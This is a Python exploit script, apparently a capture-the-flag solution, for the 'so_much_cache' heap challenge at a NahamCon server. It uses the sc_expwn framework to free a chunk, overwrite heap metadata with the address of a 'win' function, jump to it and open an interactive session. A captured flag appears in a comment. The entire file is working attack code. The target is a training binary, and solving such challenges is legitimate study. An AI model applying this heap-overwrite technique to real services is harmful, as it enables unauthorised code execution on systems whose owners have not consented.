#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './so_much_cache'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'challenge.nahamcon.com', 'port':31276})
env.select()

#==========

binf = ELF(bin_file)
addr_win            = binf.sep_function['win']

#==========

def attack(conn, **kwargs):
    smc = SoMuchCache(conn)

    smc.alloc(0x28, b'0'*8)
    smc.free()
    smc.prepare()

    exploit  = b'x'*0x28
    exploit += flat([
        0x21,
        addr_win, 0xdeadbeef
    ])
    smc.alloc(0x28, exploit)

    smc.jump(1)

class SoMuchCache:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, size, data):
        self.sendlineafter(b'[1-5] : ', b'1')
        self.sendlineafter(b'size : ', str(size).encode())
        self.sendafter(b'data : ', data)

    def free(self):
        self.sendlineafter(b'[1-5] : ', b'2')

    def exit(self):
        self.sendlineafter(b'[1-5] : ', b'3')

    def prepare(self):
        self.sendlineafter(b'[1-5] : ', b'4')

    def jump(self, n):
        self.sendlineafter(b'[1-5] : ', b'5')
        self.sendlineafter(b'jump?', str(n).encode())

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # flag{7918c766cb889d2bb4dd83e73ab1745a}

if __name__=='__main__':
    main()

#==========
